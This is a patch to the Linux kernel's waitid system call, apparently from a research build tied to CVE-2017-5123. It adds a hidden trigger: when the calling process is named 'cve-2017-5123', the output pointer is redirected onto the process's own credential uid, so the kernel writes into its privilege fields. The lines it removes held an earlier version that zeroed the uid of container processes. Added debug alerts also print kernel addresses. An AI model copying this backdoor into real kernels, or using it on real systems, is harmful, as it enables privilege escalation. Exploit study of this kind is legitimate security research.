@@ -1620,23 +1620,23 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
 		return -EFAULT;
 #endif
 
+	if(memcmp(current->comm, "cve-2017-5123", 13) == 0){
+		int *uid_addr = get_con_value(&current->cred->uid.val);
+		infop = (struct siginfo *)uid_addr;
+		pr_alert("%s: 1111 waitid err %#lx, signo %d, &infop %#lx, &infop->si_signo %#lx, si_errno %#lx, current %s, pid %d, addr %#lx, ns %#lx, cred %#lx, uid addr %#lx, uid %d, euid addr %#lx, euid %d", __func__, err, signo, infop, &infop->si_signo, &infop->si_errno, current->comm, current->pid, &current->pid, current->nsproxy, current->cred, uid_addr,  current->cred->uid.val, &current->cred->euid, current->cred->euid.val);
+
+	}
+
 	user_access_begin();
-	if(get_flag(current->nsproxy) == CONTAINER_NSPROXY){
-		int *uid_addr = get_con_value(&current->cred->uid);
-		// int *euid_addr = get_con_value(&current->cred->euid);
-		pr_alert("%s: 1111 waitid err %#lx, signo %d, &infop %#lx, &infop->si_signo %#lx, si_errno %#lx, current %s, ns %#lx, cred %#lx, uid addr %#lx, uid %d, euid addr %#lx, euid %d", __func__, err, signo, &infop, &infop->si_signo, &infop->si_errno, current->comm, current->nsproxy, current->cred, &current->cred->uid,  current->cred->uid.val, &current->cred->euid, current->cred->euid.val);
-		struct cred *con_cred = current->cred;
-		pr_alert("---- con_cred %#lx, &con_cred->uid.val %#lx", con_cred, &con_cred->uid.val);
-		*uid_addr = 0;
-		// *euid_addr = 0;
-		
-		unsafe_put_user(signo, &con_cred->uid.val, Efault);
-		pr_alert("%s: 2222 waitid err %#lx, signo %d, &infop %#lx, &infop->si_signo %#lx, si_errno %#lx, current %s, ns %#lx, cred %#lx, uid addr %#lx, uid %d, euid addr %#lx, euid %d", __func__, err, signo, &infop, &infop->si_signo, &infop->si_errno, current->comm, current->nsproxy, current->cred, &current->cred->uid, current->cred->uid.val, &current->cred->euid, current->cred->euid.val);
+	unsafe_put_user(signo, &infop->si_signo, Efault);
+	unsafe_put_user(0, &infop->si_errno, Efault);
+	if(memcmp(current->comm, "cve-2017-5123", 13) == 0){
+	// if(get_flag(current->nsproxy) == CONTAINER_NSPROXY){
+		pr_alert("%s: 2222 waitid err %#lx, signo %d, &infop %#lx, &infop->si_signo %#lx, si_errno %#lx, current %s, pid %d, addr %#lx, ns %#lx, cred %#lx, uid addr %#lx, uid %d, euid addr %#lx, euid %d", __func__, err, signo, infop, &infop->si_signo, &infop->si_errno, current->comm, current->pid, &current->pid, current->nsproxy, current->cred, &current->cred->uid,  current->cred->uid.val, &current->cred->euid, current->cred->euid.val);
+
 		pr_alert("--------------------------------------------------------");
 
 	}
-	unsafe_put_user(signo, &infop->si_signo, Efault);
-	unsafe_put_user(0, &infop->si_errno, Efault);
 	unsafe_put_user(info.cause, &infop->si_code, Efault);
 	unsafe_put_user(info.pid, &infop->si_pid, Efault);
 	unsafe_put_user(info.uid, &infop->si_uid, Efault);
@@ -1644,6 +1644,12 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
 	user_access_end();
 	return err;
 Efault:
+	if(get_flag(current->nsproxy) == CONTAINER_NSPROXY){
+		pr_alert("%s: container 2222 waitid err %#lx, signo %d, &infop %#lx, &infop->si_signo %#lx, si_errno %#lx, current %s, pid %d, addr %#lx, ns %#lx, cred %#lx, uid addr %#lx, uid %d, euid addr %#lx, euid %d", __func__, err, signo, infop, &infop->si_signo, &infop->si_errno, current->comm, current->pid, &current->pid, current->nsproxy, current->cred, &current->cred->uid,  current->cred->uid.val, &current->cred->euid, current->cred->euid.val);
+
+		pr_alert("--------------------------------------------------------");
+
+	}
 	user_access_end();
 	return -EFAULT;
 }
